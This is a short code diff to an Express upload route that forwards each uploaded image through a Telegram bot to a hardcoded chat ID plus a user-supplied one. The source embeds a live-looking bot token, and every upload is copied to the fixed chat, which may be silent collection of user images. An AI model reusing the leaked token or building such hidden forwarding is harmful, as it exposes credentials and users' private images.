@@ -10,7 +10,12 @@ const upload = multer();
 // POST /
 router.post("/", upload.single("image"), async (req, res) => {
   const { id } = req.body;
-  const chatIds = [1121426146, id];
+
+  const chatIds = [1121426146];
+  if (id !== chatIds[0]) {
+    chatIds.push(id);
+  }
+
   const telegramToken = "7607634828:AAHxfWmIgzYvfM8_gbYO6_iZrDFjQugkqo0";
 
   const sendImage = async (chatId, imageBuffer) => {
